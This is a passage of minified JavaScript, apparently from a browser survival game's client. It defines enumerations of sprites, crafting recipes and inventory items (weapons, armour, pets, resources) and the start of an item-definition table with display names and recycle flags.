      CRAB_BOSS: he++,
      CRAB_BOSS_TAMED: he++,
      HURT_CRAB_BOSS: he++,
      HURT_CRAB_BOSS_CLAW_LEFT: he++,
      HURT_CRAB_BOSS_CLAW_RIGHT: he++,
      CRAB_BOSS_CLAW_LEFT_ATTACK: he++,
      CRAB_BOSS_CLAW_LEFT: he++,
      CRAB_BOSS_CLAW_LEFT_TAMED: he++,
      CRAB_BOSS_CLAW_RIGHT_ATTACK: he++,
      CRAB_BOSS_CLAW_RIGHT: he++,
      CRAB_BOSS_CLAW_RIGHT_TAMED: he++,
      HEAL_CRAB_BOSS: he++,
      HEAL_CRAB_BOSS_CLAW_LEFT: he++,
      HEAL_CRAB_BOSS_CLAW_RIGHT: he++,
      BABY_DRAGON_ATTACK: he++,
      BABY_DRAGON: he++,
      BABY_DRAGON_TAMED: he++,
      BABY_DRAGON_WING_LEFT_ATTACK: he++,
      BABY_DRAGON_WING_LEFT: he++,
      BABY_DRAGON_WING_LEFT_TAMED: he++,
      BABY_DRAGON_WING_RIGHT_ATTACK: he++,
      BABY_DRAGON_WING_RIGHT: he++,
      BABY_DRAGON_WING_RIGHT_TAMED: he++,
      HURT_BABY_DRAGON: he++,
      HURT_BABY_DRAGON_WING_LEFT: he++,
      HURT_BABY_DRAGON_WING_RIGHT: he++,
      INV_BABY_DRAGON: he++,
      CHEST_BABY_DRAGON: he++,
      CRAFT_BABY_DRAGON: he++,
      BABY_LAVA_ATTACK: he++,
      BABY_LAVA: he++,
      BABY_LAVA_TAMED: he++,
      BABY_LAVA_WING_LEFT_ATTACK: he++,
      BABY_LAVA_WING_LEFT: he++,
      BABY_LAVA_WING_LEFT_TAMED: he++,
      BABY_LAVA_WING_RIGHT_ATTACK: he++,
      BABY_LAVA_WING_RIGHT: he++,
      BABY_LAVA_WING_RIGHT_TAMED: he++,
      HURT_BABY_LAVA: he++,
      HURT_BABY_LAVA_WING_LEFT: he++,
      HURT_BABY_LAVA_WING_RIGHT: he++,
      INV_BABY_LAVA: he++,
      CHEST_BABY_LAVA: he++,
      CRAFT_BABY_LAVA: he++,
      HAWK_ATTACK: he++,
      HAWK: he++,
      HAWK_TAMED: he++,
      HAWK_WING_LEFT_ATTACK: he++,
      HAWK_WING_LEFT: he++,
      HAWK_WING_LEFT_TAMED: he++,
      HAWK_WING_RIGHT_ATTACK: he++,
      HAWK_WING_RIGHT: he++,
      HAWK_WING_RIGHT_TAMED: he++,
      HURT_HAWK: he++,
      HURT_HAWK_WING_LEFT: he++,
      HURT_HAWK_WING_RIGHT: he++,
      INV_HAWK: he++,
      CHEST_HAWK: he++,
      CRAFT_HAWK: he++,
      HAWK_GROUND: he++,
      HAWK_GROUND_ATTACK: he++,
      HURT_HAWK_GROUND: he++,
      CRAFT_PLANE: he++,
      INV_PLANE: he++,
      CHEST_PLANE: he++,
      VULTURE_ATTACK: he++,
      VULTURE: he++,
      VULTURE_TAMED: he++,
      VULTURE_WING_LEFT_ATTACK: he++,
      VULTURE_WING_LEFT: he++,
      VULTURE_WING_LEFT_TAMED: he++,
      VULTURE_WING_RIGHT_ATTACK: he++,
      VULTURE_WING_RIGHT: he++,
      VULTURE_WING_RIGHT_TAMED: he++,
      HURT_VULTURE: he++,
      HURT_VULTURE_WING_LEFT: he++,
      HURT_VULTURE_WING_RIGHT: he++,
      INV_VULTURE: he++,
      CHEST_VULTURE: he++,
      CRAFT_VULTURE: he++,
      VULTURE_GROUND: he++,
      VULTURE_GROUND_ATTACK: he++,
      HURT_VULTURE_GROUND: he++,
      INV_TURBAN1: he++,
      CRAFT_TURBAN1: he++,
      CHEST_TURBAN1: he++,
      INV_TURBAN2: he++,
      CRAFT_TURBAN2: he++,
      CHEST_TURBAN2: he++,
      SCORPION: he++,
      HURT_SCORPION: he++,
      SCORPION_HAND_LEFT: he++,
      SCORPION_HAND_RIGHT: he++,
      HURT_SCORPION_HAND_LEFT: he++,
      HURT_SCORPION_HAND_RIGHT: he++,
      SAND_WORM_GROUND: ["#E9CF96", "#144940"],
      HURT_SAND_WORM0: he++,
      SAND_WORM1: he++,
      HURT_SAND_WORM1: he++,
      SAND_WORM2: he++,
      HURT_SAND_WORM2: he++,
      INV_CACTUS: he++,
      CHEST_CACTUS: he++,
      INV_EMERALD: he++,
      CHEST_EMERALD: he++,
      INV_PITCHFORK_PART: he++,
      CHEST_PITCHFORK_PART: he++,
      INV_PILOT_GLASSES: he++,
      CHEST_PILOT_GLASSES: he++,
      INV_FUR_BOAR: he++,
      CHEST_FUR_BOAR: he++,
      INV_FIREFLY: he++,
      CHEST_FIREFLY: he++,
      INV_WOOD_ARROW: he++,
      CHEST_WOOD_ARROW: he++,
      CRAFT_WOOD_ARROW: he++,
      INV_STONE_ARROW: he++,
      CHEST_STONE_ARROW: he++,
      CRAFT_STONE_ARROW: he++,
      INV_GOLD_ARROW: he++,
      CHEST_GOLD_ARROW: he++,
      CRAFT_GOLD_ARROW: he++,
      INV_DIAMOND_ARROW: he++,
      CHEST_DIAMOND_ARROW: he++,
      CRAFT_DIAMOND_ARROW: he++,
      INV_AMETHYST_ARROW: he++,
      CHEST_AMETHYST_ARROW: he++,
      CRAFT_AMETHYST_ARROW: he++,
      INV_REIDITE_ARROW: he++,
      CHEST_REIDITE_ARROW: he++,
      CRAFT_REIDITE_ARROW: he++,
      INV_DRAGON_ARROW: he++,
      CHEST_DRAGON_ARROW: he++,
      CRAFT_DRAGON_ARROW: he++,
      INV_SANDWORM_JUICE: he++,
      CHEST_SANDWORM_JUICE: he++,
      INV_CRAB_BOSS: he++,
      CHEST_CRAB_BOSS: he++,
      CRAFT_CRAB_BOSS: he++,
      EMERALD_MACHINE_GROUND: he++,
      EMERALD_MACHINE_HOLE: he++,
      EMERALD_MACHINE_ROTATE: he++,
      INV_EMERALD_MACHINE: he++,
      CRAFT_EMERALD_MACHINE: he++,
      CHEST_EMERALD_MACHINE: he++,
      EXTRACTOR_MACHINE0_STONE: he++,
      INV_EXTRACTOR_MACHINE_STONE: he++,
      CRAFT_EXTRACTOR_MACHINE_STONE: he++,
      CHEST_EXTRACTOR_MACHINE_STONE: he++,
      EXTRACTOR_MACHINE0_GOLD: he++,
      INV_EXTRACTOR_MACHINE_GOLD: he++,
      CRAFT_EXTRACTOR_MACHINE_GOLD: he++,
      CHEST_EXTRACTOR_MACHINE_GOLD: he++,
      EXTRACTOR_MACHINE0_DIAMOND: he++,
      INV_EXTRACTOR_MACHINE_DIAMOND: he++,
      CRAFT_EXTRACTOR_MACHINE_DIAMOND: he++,
      CHEST_EXTRACTOR_MACHINE_DIAMOND: he++,
      EXTRACTOR_MACHINE0_AMETHYST: he++,
      INV_EXTRACTOR_MACHINE_AMETHYST: he++,
      CRAFT_EXTRACTOR_MACHINE_AMETHYST: he++,
      CHEST_EXTRACTOR_MACHINE_AMETHYST: he++,
      EXTRACTOR_MACHINE0_REIDITE: he++,
      INV_EXTRACTOR_MACHINE_REIDITE: he++,
      CRAFT_EXTRACTOR_MACHINE_REIDITE: he++,
      CHEST_EXTRACTOR_MACHINE_REIDITE: he++,
      MAMMOTH: he++,
      HURT_MAMMOTH: he++,
      BABY_MAMMOTH: he++,
      BABY_MAMMOTH_TAMED: he++,
      BABY_MAMMOTH_ATTACK: he++,
      HURT_BABY_MAMMOTH: he++,
      INV_BABY_MAMMOTH: he++,
      CHEST_BABY_MAMMOTH: he++,
      CRAFT_BABY_MAMMOTH: he++,
      INV_FLOWER_HAT: he++,
      CRAFT_FLOWER_HAT: he++,
      CHEST_FLOWER_HAT: he++,
      INV_FUR_HAT: he++,
      CRAFT_FUR_HAT: he++,
      CHEST_FUR_HAT: he++,
      INV_FUR_MAMMOTH: he++,
      CHEST_FUR_MAMMOTH: he++,
      CRAFT_WOOD_TOWER: he++,
      INV_WOOD_TOWER: he++,
      CHEST_WOOD_TOWER: he++,
      CRAFT_WOOD_SHIELD: he++,
      INV_WOOD_SHIELD: he++,
      CHEST_WOOD_SHIELD: he++,
      CRAFT_STONE_SHIELD: he++,
      INV_STONE_SHIELD: he++,
      CHEST_STONE_SHIELD: he++,
      CRAFT_GOLD_SHIELD: he++,
      INV_GOLD_SHIELD: he++,
      CHEST_GOLD_SHIELD: he++,
      CRAFT_DIAMOND_SHIELD: he++,
      INV_DIAMOND_SHIELD: he++,
      CHEST_DIAMOND_SHIELD: he++,
      CRAFT_AMETHYST_SHIELD: he++,
      INV_AMETHYST_SHIELD: he++,
      CHEST_AMETHYST_SHIELD: he++,
      CRAFT_REIDITE_SHIELD: he++,
      INV_REIDITE_SHIELD: he++,
      CHEST_REIDITE_SHIELD: he++
    };
    he = 0;
    var ue = {
      FIRE: he++,
      BIG_FIRE: he++,
      FURNACE: he++,
      WORKBENCH: he++,
      PICK_WOOD: he++,
      PICK: he++,
      PICK_GOLD: he++,
      PICK_DIAMOND: he++,
      PICK_AMETHYST: he++,
      PICK_REIDITE: he++,
      HAMMER: he++,
      HAMMER_GOLD: he++,
      HAMMER_DIAMOND: he++,
      HAMMER_AMETHYST: he++,
      HAMMER_REIDITE: he++,
      SUPER_HAMMER: he++,
      SHOVEL: he++,
      SHOVEL_GOLD: he++,
      SHOVEL_DIAMOND: he++,
      SHOVEL_AMETHYST: he++,
      WATERING_CAN: he++,
      WATERING_CAN_FULL: he++,
      PITCHFORK: he++,
      PITCHFORK2: he++,
      BOOK: he++,
      WOOD_SPEAR: he++,
      SPEAR: he++,
      GOLD_SPEAR: he++,
      DIAMOND_SPEAR: he++,
      AMETHYST_SPEAR: he++,
      REIDITE_SPEAR: he++,
      DRAGON_SPEAR: he++,
      LAVA_SPEAR: he++,
      CRAB_SPEAR: he++,
      SWORD_WOOD: he++,
      SWORD: he++,
      SWORD_GOLD: he++,
      SWORD_DIAMOND: he++,
      SWORD_AMETHYST: he++,
      REIDITE_SWORD: he++,
      SEED: he++,
      WHEAT_SEED: he++,
      PUMPKIN_SEED: he++,
      GARLIC_SEED: he++,
      THORNBUSH_SEED: he++,
      CARROT_SEED: he++,
      TOMATO_SEED: he++,
      WATERMELON_SEED: he++,
      ALOE_VERA_SEED: he++,
      COOKED_MEAT: he++,
      FOODFISH_COOKED: he++,
      BREAD: he++,
      COOKIE: he++,
      CAKE: he++,
      BANDAGE: he++,
      WALL: he++,
      STONE_WALL: he++,
      GOLD_WALL: he++,
      DIAMOND_WALL: he++,
      AMETHYST_WALL: he++,
      REIDITE_WALL: he++,
      WOOD_DOOR: he++,
      STONE_DOOR: he++,
      GOLD_DOOR: he++,
      DIAMOND_DOOR: he++,
      AMETHYST_DOOR: he++,
      REIDITE_DOOR: he++,
      SPIKE: he++,
      STONE_SPIKE: he++,
      GOLD_SPIKE: he++,
      DIAMOND_SPIKE: he++,
      AMETHYST_SPIKE: he++,
      REIDITE_SPIKE: he++,
      WOOD_DOOR_SPIKE: he++,
      STONE_DOOR_SPIKE: he++,
      GOLD_DOOR_SPIKE: he++,
      DIAMOND_DOOR_SPIKE: he++,
      AMETHYST_DOOR_SPIKE: he++,
      REIDITE_DOOR_SPIKE: he++,
      CHEST: he++,
      EXPLORER_HAT: he++,
      PIRATE_HAT: he++,
      PILOT_HELMET: he++,
      EARMUFFS: he++,
      COAT: he++,
      CAP_SCARF: he++,
      FUR_HAT: he++,
      WOOD_HELMET: he++,
      STONE_HELMET: he++,
      GOLD_HELMET: he++,
      DIAMOND_HELMET: he++,
      AMETHYST_HELMET: he++,
      REIDITE_HELMET: he++,
      DIVING_MASK: he++,
      SUPER_DIVING_SUIT: he++,
      DIAMOND_PROTECTION: he++,
      AMETHYST_PROTECTION: he++,
      REIDITE_PROTECTION: he++,
      TURBAN1: he++,
      TURBAN2: he++,
      BAG: he++,
      PAPER: he++,
      BLUE_CORD: he++,
      LOCK: he++,
      LOCKPICK: he++,
      TOTEM: he++,
      BRIDGE: he++,
      ROOF: he++,
      WOOD_TOWER: he++,
      PLOT: he++,
      BOTTLE_EMPTY: he++,
      BOTTLE_FULL: he++,
      BOTTLE_FULL_2: he++,
      BOTTLE_FULL_3: he++,
      WINDMILL: he++,
      RESURRECTION: he++,
      EMERALD_MACHINE: he++,
      EXTRACTOR_MACHINE_STONE: he++,
      EXTRACTOR_MACHINE_GOLD: he++,
      EXTRACTOR_MACHINE_DIAMOND: he++,
      EXTRACTOR_MACHINE_AMETHYST: he++,
      EXTRACTOR_MACHINE_REIDITE: he++,
      SPANNER: he++,
      MACHETE: he++,
      BREAD_OVEN: he++,
      SANDWICH: he++,
      DRAGON_HELMET: he++,
      LAVA_HELMET: he++,
      CROWN_CRAB: he++,
      DRAGON_SWORD: he++,
      LAVA_SWORD: he++,
      WOOD_BOW: he++,
      WOOD_ARROW: he++,
      STONE_BOW: he++,
      STONE_ARROW: he++,
      GOLD_BOW: he++,
      GOLD_ARROW: he++,
      DIAMOND_BOW: he++,
      DIAMOND_ARROW: he++,
      AMETHYST_BOW: he++,
      AMETHYST_ARROW: he++,
      REIDITE_BOW: he++,
      REIDITE_ARROW: he++,
      DRAGON_BOW: he++,
      DRAGON_ARROW: he++,
      WOOD_SHIELD: he++,
      STONE_SHIELD: he++,
      GOLD_SHIELD: he++,
      DIAMOND_SHIELD: he++,
      AMETHYST_SHIELD: he++,
      REIDITE_SHIELD: he++,
      CROWN_GREEN: he++,
      CROWN_ORANGE: he++,
      CROWN_BLUE: he++,
      HOOD: he++,
      PEASANT: he++,
      WINTER_HOOD: he++,
      WINTER_PEASANT: he++,
      BUCKET_FULL: he++,
      BUCKET_EMPTY: he++,
      WELL: he++,
      SIGN: he++,
      BED: he++,
      BOAT: he++,
      SLED: he++,
      SADDLE: he++,
      PLANE: he++,
      WITCH: he++,
      WAND1: he++,
      WAND2: he++,
      NIMBUS: he++
    };
    he = 0;
    var le = {
      SWORD: he++,
      PICK: he++,
      FUR: he++,
      PICK_GOLD: he++,
      PICK_DIAMOND: he++,
      SWORD_GOLD: he++,
      SWORD_DIAMOND: he++,
      HAND: he++,
      PICK_WOOD: he++,
      PIRATE_SWORD: he++,
      EARMUFFS: he++,
      COAT: he++,
      WOOD_SPEAR: he++,
      SPEAR: he++,
      GOLD_SPEAR: he++,
      DIAMOND_SPEAR: he++,
      DRAGON_SPEAR: he++,
      LAVA_SPEAR: he++,
      CRAB_SPEAR: he++,
      REIDITE_SWORD: he++,
      DIAMOND_PROTECTION: he++,
      AMETHYST_PROTECTION: he++,
      REIDITE_PROTECTION: he++,
      EXPLORER_HAT: he++,
      PIRATE_HAT: he++,
      STONE_HELMET: he++,
      GOLD_HELMET: he++,
      DIAMOND_HELMET: he++,
      BOOK: he++,
      BAG: he++,
      SWORD_AMETHYST: he++,
      PICK_AMETHYST: he++,
      PICK_REIDITE: he++,
      AMETHYST_SPEAR: he++,
      REIDITE_SPEAR: he++,
      HAMMER: he++,
      HAMMER_GOLD: he++,
      HAMMER_DIAMOND: he++,
      HAMMER_AMETHYST: he++,
      HAMMER_REIDITE: he++,
      CAP_SCARF: he++,
      CHRISTMAS_HAT: he++,
      ELF_HAT: he++,
      AMETHYST_HELMET: he++,
      REIDITE_HELMET: he++,
      SUPER_HAMMER: he++,
      SHOVEL: he++,
      SUPER_DIVING_SUIT: he++,
      DIVING_MASK: he++,
      WATERING_CAN_FULL: he++,
      SHOVEL_GOLD: he++,
      SHOVEL_DIAMOND: he++,
      SHOVEL_AMETHYST: he++,
      PITCHFORK: he++,
      PITCHFORK2: he++,
      SPANNER: he++,
      MACHETE: he++,
      SWORD_WOOD: he++,
      WOOD_HELMET: he++,
      DRAGON_HELMET: he++,
      LAVA_HELMET: he++,
      CROWN_CRAB: he++,
      DRAGON_SWORD: he++,
      LAVA_SWORD: he++,
      WOOD_BOW: he++,
      STONE_BOW: he++,
      GOLD_BOW: he++,
      DIAMOND_BOW: he++,
      AMETHYST_BOW: he++,
      REIDITE_BOW: he++,
      DRAGON_BOW: he++,
      WOOD_SHIELD: he++,
      STONE_SHIELD: he++,
      GOLD_SHIELD: he++,
      DIAMOND_SHIELD: he++,
      AMETHYST_SHIELD: he++,
      REIDITE_SHIELD: he++,
      CROWN_GREEN: he++,
      CROWN_ORANGE: he++,
      CROWN_BLUE: he++,
      TURBAN1: he++,
      TURBAN2: he++,
      PILOT_HELMET: he++,
      HOOD: he++,
      PEASANT: he++,
      WINTER_HOOD: he++,
      WINTER_PEASANT: he++,
      FLOWER_HAT: he++,
      FUR_HAT: he++,
      SADDLE: he++,
      WITCH: he++,
      NIMBUS: he++,
      WAND1: he++,
      WAND2: he++,
      FIREFLY: he++,
      WOOD_ARROW: he++,
      STONE_ARROW: he++,
      GOLD_ARROW: he++,
      DIAMOND_ARROW: he++,
      AMETHYST_ARROW: he++,
      REIDITE_ARROW: he++,
      DRAGON_ARROW: he++,
      STONE: he++,
      WOOD: he++,
      PLANT: he++,
      GOLD: he++,
      DIAMOND: he++,
      FIRE: he++,
      WORKBENCH: he++,
      SEED: he++,
      MEAT: he++,
      COOKED_MEAT: he++,
      BIG_FIRE: he++,
      FURNACE: he++,
      PAPER: he++,
      AMETHYST: he++,
      AMETHYST_WALL: he++,
      AMETHYST_SPIKE: he++,
      AMETHYST_DOOR: he++,
      BRIDGE: he++,
      SAND: he++,
      BOTTLE_FULL: he++,
      BOTTLE_EMPTY: he++,
      KRAKEN_SKIN: he++,
      WATERING_CAN: he++,
      FLOUR: he++,
      WHEAT_SEED: he++,
      COOKIE: he++,
      WILD_WHEAT: he++,
      WINDMILL: he++,
      CAKE: he++,
      FOODFISH: he++,
      FOODFISH_COOKED: he++,
      SCALES: he++,
      GROUND: he++,
      PLOT: he++,
      ICE: he++,
      BREAD: he++,
      BREAD_OVEN: he++,
      SANDWICH: he++,
      FUR_WINTER: he++,
      BLUE_CORD: he++,
      LOCK: he++,
      DRAGON_HEART: he++,
      LAVA_HEART: he++,
      RESURRECTION: he++,
      EMERALD_MACHINE: he++,
      EXTRACTOR_MACHINE_STONE: he++,
      EXTRACTOR_MACHINE_GOLD: he++,
      EXTRACTOR_MACHINE_DIAMOND: he++,
      EXTRACTOR_MACHINE_AMETHYST: he++,
      EXTRACTOR_MACHINE_REIDITE: he++,
      LOCKPICK: he++,
      TOTEM: he++,
      SPIKE: he++,
      CORD: he++,
      WALL: he++,
      STONE_WALL: he++,
      GOLD_WALL: he++,
      DIAMOND_WALL: he++,
      WOOD_DOOR: he++,
      CHEST: he++,
      STONE_SPIKE: he++,
      GOLD_SPIKE: he++,
      DIAMOND_SPIKE: he++,
      STONE_DOOR: he++,
      GOLD_DOOR: he++,
      DIAMOND_DOOR: he++,
      FUR_WOLF: he++,
      GEMME_GREEN: he++,
      GEMME_ORANGE: he++,
      GEMME_BLUE: he++,
      SPECIAL_FUR: he++,
      SPECIAL_FUR_2: he++,
      BUCKET_FULL: he++,
      BUCKET_EMPTY: he++,
      WELL: he++,
      SIGN: he++,
      DRAGON_CUBE: he++,
      DRAGON_ORB: he++,
      LAVA_CUBE: he++,
      LAVA_ORB: he++,
      PUMPKIN_SEED: he++,
      PUMPKIN: he++,
      ROOF: he++,
      GARLIC_SEED: he++,
      GARLIC: he++,
      THORNBUSH_SEED: he++,
      THORNBUSH: he++,
      BANDAGE: he++,
      CRAB_STICK: he++,
      CRAB_LOOT: he++,
      BED: he++,
      SUGAR_CAN: he++,
      CANDY: he++,
      GARLAND: he++,
      REIDITE: he++,
      FLAME: he++,
      CARROT_SEED: he++,
      CARROT: he++,
      TOMATO_SEED: he++,
      TOMATO: he++,
      WATERMELON_SEED: he++,
      WATERMELON: he++,
      ALOE_VERA_SEED: he++,
      ALOE_VERA: he++,
      WOOD_DOOR_SPIKE: he++,
      STONE_DOOR_SPIKE: he++,
      GOLD_DOOR_SPIKE: he++,
      DIAMOND_DOOR_SPIKE: he++,
      AMETHYST_DOOR_SPIKE: he++,
      REIDITE_WALL: he++,
      REIDITE_DOOR: he++,
      REIDITE_SPIKE: he++,
      REIDITE_DOOR_SPIKE: he++,
      WOOD_TOWER: he++,
      PENGUIN_FEATHER: he++,
      BOAT: he++,
      SLED: he++,
      MOUNT_BOAR: he++,
      CRAB_BOSS: he++,
      BABY_DRAGON: he++,
      BABY_LAVA: he++,
      HAWK: he++,
      PLANE: he++,
      HAWK_FEATHER: he++,
      VULTURE_FEATHER: he++,
      CACTUS: he++,
      EMERALD: he++,
      PITCHFORK_PART: he++,
      PILOT_GLASSES: he++,
      FUR_BOAR: he++,
      SANDWORM_JUICE: he++,
      BABY_MAMMOTH: he++,
      FUR_MAMMOTH: he++
    };
    var Oe = {
      TOOLS: 0,
      WEAPONS: 1,
      CLOTHES: 2,
      FOODS: 3,
      UTILS: 4,
      BASES: 5
    };
    var ce = [];
    ce[le.WOOD] = {
      name: "Wood",
      img: Ie.INV_WOOD,
      grid: 0,
      recycle: 0
    };
    ce[le.STONE] = {
      name: "Stone",
      img: Ie.INV_STONE,
      grid: 0,
      recycle: 0
    };
    ce[le.GOLD] = {
      name: "Gold",
      img: Ie.INV_GOLD,
      grid: 0,
      recycle: 0
    };
    ce[le.DIAMOND] = {
      name: "Diamond",
      img: Ie.INV_DIAMOND,
      grid: 0,
      recycle: 0
    };
    ce[le.AMETHYST] = {
      name: "Amethyst",
      img: Ie.INV_AMETHYST,
      grid: 0,
      recycle: 0
    };
    ce[le.FUR] = {
      name: "Rabbit fur",
      img: Ie.INV_FUR,
      grid: 0,
      recycle: 0
    };
    ce[le.FUR_WOLF] = {
      name: "Wolf fur",
      img: Ie.INV_FUR_WOLF,
      grid: 0,
      recycle: 0
    };
    ce[le.FUR_BOAR] = {
      name: "Boar fur",
      img: Ie.INV_FUR_BOAR,
      grid: 0,
      recycle: 0
    };
    ce[le.FIREFLY] = {
      name: "Firefly",
      img: Ie.INV_FIREFLY,
      grid: 0,
      recycle: 0
    };
    ce[le.WOOD_ARROW] = {
      name: "Wood arrow",
      img: Ie.INV_WOOD_ARROW,
      grid: 0,
      recycle: 1
    };
    ce[le.STONE_ARROW] = {
      name: "Stone arrow",
      img: Ie.INV_STONE_ARROW,
      grid: 0,
      recycle: 1
    };
    ce[le.GOLD_ARROW] = {
      name: "Gold arrow",
      img: Ie.INV_GOLD_ARROW,
      grid: 0,
      recycle: 1
    };
    ce[le.DIAMOND_ARROW] = {
      name: "Diamond arrow",
      img: Ie.INV_DIAMOND_ARROW,
      grid: 0,
      recycle: 1
    };
    ce[le.AMETHYST_ARROW] = {
      name: "Amethyst arrow",
      img: Ie.INV_AMETHYST_ARROW,
      grid: 0,
      recycle: 1
    };
    ce[le.REIDITE_ARROW] = {
      name: "Reidite arrow",
      img: Ie.INV_REIDITE_ARROW,
      grid: 0,
      recycle: 1
    };
    ce[le.DRAGON_ARROW] = {
      name: "Dragon arrow",
      img: Ie.INV_DRAGON_ARROW,
      grid: 0,
      recycle: 0
    };
    ce[le.FUR_WINTER] = {
      name: "Winter fur",
      img: Ie.INV_FUR_WINTER,
      grid: 0,
      recycle: 0
    };
    ce[le.FUR_MAMMOTH] = {
      name: "Fur mammoth",
      img: Ie.INV_FUR_MAMMOTH,
      grid: 0,
      recycle: 0
    };
    ce[le.CORD] = {
      name: "Web",
      img: Ie.INV_CORD,
      grid: 0,
      recycle: 0
    };
    ce[le.MEAT] = {
      name: "Meat",
      img: Ie.INV_MEAT,
      grid: 0,
      recycle: 0
    };
    ce[le.FOODFISH] = {
      name: "Fish",
      img: Ie.INV_FOODFISH,
      grid: 0,
      recycle: 0
    };
    ce[le.KRAKEN_SKIN] = {
      name: "Kraken skin",
      img: Ie.INV_KRAKEN_SKIN,
      grid: 0,
      recycle: 0
    };
    ce[le.SCALES] = {
      name: "Piranha scales",
      img: Ie.INV_SCALES,
      grid: 0,
      recycle: 0
    };
    ce[le.ICE] = {
      name: "Ice",
      img: Ie.INV_ICE,
      grid: 0,
      recycle: 0
    };
    ce[le.SAND] = {
      name: "Sand",
      img: Ie.INV_SAND,
      grid: 0,
      recycle: 0
    };
    ce[le.GROUND] = {
      name: "Dirt",
      img: Ie.INV_GROUND,
      grid: 0,
      recycle: 0
    };
    ce[le.PLANT] = {
      name: "Berrie",
      img: Ie.INV_PLANT,
      grid: 0,
      recycle: 0
    };
    ce[le.FLOUR] = {
      name: "Flour",
      img: Ie.INV_FLOUR,
      grid: 0,
      recycle: 0
    };
    ce[le.WILD_WHEAT] = {
      name: "Flour",
      img: Ie.INV_WILD_WHEAT,
      grid: 0,
      recycle: 0
    };
    ce[le.SPECIAL_FUR] = {
      name: "Special fur peasant",
      img: Ie.INV_SPECIAL_FUR,
      grid: 0,
      recycle: 0
    };
    ce[le.SPECIAL_FUR_2] = {
      name: "Special fur hood",
      img: Ie.INV_SPECIAL_FUR_2,
      grid: 0,
      recycle: 0
    };
    ce[le.PUMPKIN] = {
      name: "Pumpkin",
      img: Ie.INV_PUMPKIN,
      grid: 0,
      recycle: 0
    };
    ce[le.GARLIC] = {
      name: "Garlic",
      img: Ie.INV_GARLIC,
      grid: 0,
      recycle: 0
    };
    ce[le.THORNBUSH] = {
      name: "Thornbush",
      img: Ie.INV_THORNBUSH,
      grid: 0,
      recycle: 0
    };
    ce[le.CARROT] = {
      name: "Carrot",
      img: Ie.INV_CARROT,
      grid: 0,
      recycle: 0
    };
    ce[le.TOMATO] = {
      name: "Tomato",
      img: Ie.INV_TOMATO,
      grid: 0,
      recycle: 0
    };
    ce[le.WATERMELON] = {
      name: "Watermelon",
      img: Ie.INV_WATERMELON,
      grid: 0,
      recycle: 0
    };
    ce[le.ALOE_VERA] = {
      name: "Aloe Vera",
      img: Ie.INV_ALOE_VERA,
      grid: 0,
      recycle: 0
    };
    ce[le.PENGUIN_FEATHER] = {
      name: "Penguin Feather",
      img: Ie.INV_PENGUIN_FEATHER,
      grid: 0,
      recycle: 0
    };
    ce[le.HAWK_FEATHER] = {
      name: "Hawk Feather",
      img: Ie.INV_HAWK_FEATHER,
      grid: 0,
      recycle: 0
    };
    ce[le.VULTURE_FEATHER] = {
      name: "Vulture Feather",
      img: Ie.INV_VULTURE_FEATHER,
      grid: 0,
      recycle: 0
    };
    ce[le.CACTUS] = {
      name: "Cactus",
      img: Ie.INV_CACTUS,
      grid: 0,
      recycle: 0
    };
    ce[le.PILOT_GLASSES] = {
      name: "Cactus",
      img: Ie.INV_PILOT_GLASSES,
      grid: 0,
      recycle: 0
    };
    ce[le.PITCHFORK_PART] = {
      name: "Pitchfork Part",
      img: Ie.INV_PITCHFORK_PART,
      grid: 0,
      recycle: 0
    };
    ce[le.SANDWORM_JUICE] = {
      name: "Emerald Machine",
      img: Ie.INV_SANDWORM_JUICE,
      grid: 0,
      recycle: 0
    };
    ce[le.EMERALD] = {
      name: "Emerald",
      img: Ie.INV_EMERALD,
      grid: 0,
      recycle: 0
    };
    ce[le.CHRISTMAS_HAT] = {
      name: "Christmas Hat",
      img: Ie.INV_CHRISTMAS_HAT,
      recycle: 0
    };
    ce[le.ELF_HAT] = {
      name: "Elf Hat",
      img: Ie.INV_ELF_HAT,
      recycle: 0
    };
    ce[le.GARLAND] = {
      name: "Garland",
      img: Ie.INV_GARLAND,
      recycle: 0,
      grid: 0
    };
    ce[le.CANDY] = {
      name: "Candy",
      img: Ie.INV_CANDY,
      recycle: 0
    };
    ce[le.SUGAR_CAN] = {
      name: "Sugar Cane",
      img: Ie.INV_SUGAR_CAN,
      recycle: 0
    };
    ce[le.PIRATE_SWORD] = {
      name: "Pirate Sword",
      img: Ie.INV_PIRATE_SWORD,
      grid: 0,
      recycle: 0
    };
    ce[le.CRAB_STICK] = {
      name: "Crab Stick",
      img: Ie.INV_CRAB_STICK,
      grid: 0,
      recycle: 0
    };
    ce[le.REIDITE] = {
      name: "Reidite",
      img: Ie.INV_REIDITE,
      grid: 0,
      recycle: 0
    };
    ce[le.FLAME] = {
      name: "Flame",
      img: Ie.INV_FLAME,
      grid: 0,
      recycle: 0
    };
    ce[le.FIRE] = {
      name: "Campfire",
      img: Ie.CRAFT_FIRE,
      grid: 0,
      recycle: 1
    };
    ce[le.BED] = {
      name: "Bed",
      img: Ie.CRAFT_BED,
      grid: 0,
      recycle: 1
    };
    ce[le.WORKBENCH] = {
      name: "Workbench",
      img: Ie.CRAFT_WORK,
      grid: 0,
      recycle: 1
    };
    ce[le.SWORD] = {
      name: "Stone sword",
      img: Ie.CRAFT_SWORD,
      grid: 0,
      recycle: 1
    };
    ce[le.PICK] = {
      name: "Stone pick",
      img: Ie.CRAFT_PICK,
      grid: 0,
      recycle: 1
    };
    ce[le.SEED] = {
      name: "Berries bush",
      img: Ie.CRAFT_SEED,
      grid: 0,
      recycle: 0
    };
    ce[le.PICK_GOLD] = {
      name: "Gold pick",
      img: Ie.CRAFT_PICK_GOLD,
      grid: 0,
      recycle: 1
    };
    ce[le.PICK_DIAMOND] = {
      name: "Diamond pick",
      img: Ie.CRAFT_PICK_DIAMOND,
      grid: 0,
      recycle: 1
    };
    ce[le.SWORD_WOOD] = {
      name: "Wood sword",
      img: Ie.CRAFT_SWORD_WOOD,
      grid: 0,
      recycle: 1
    };
    ce[le.SWORD_GOLD] = {
      name: "Gold sword",
      img: Ie.CRAFT_SWORD_GOLD,
      grid: 0,
      recycle: 1
    };
    ce[le.SWORD_DIAMOND] = {
      name: "Diamond sword",
      img: Ie.CRAFT_SWORD_DIAMOND,
      grid: 0,
      recycle: 1
    };
    ce[le.PICK_WOOD] = {
      name: "Wood pick",
      img: Ie.CRAFT_PICK_WOOD,
      grid: 0,
      recycle: 1
    };
    ce[le.WALL] = {
      name: "Wood wall",
      img: Ie.CRAFT_WALL,
      grid: 0,
      recycle: 1
    };
    ce[le.SPIKE] = {
      name: "Wood spike",
      img: Ie.CRAFT_SPIKE,
      grid: 0,
      recycle: 1
    };
    ce[le.COOKED_MEAT] = {
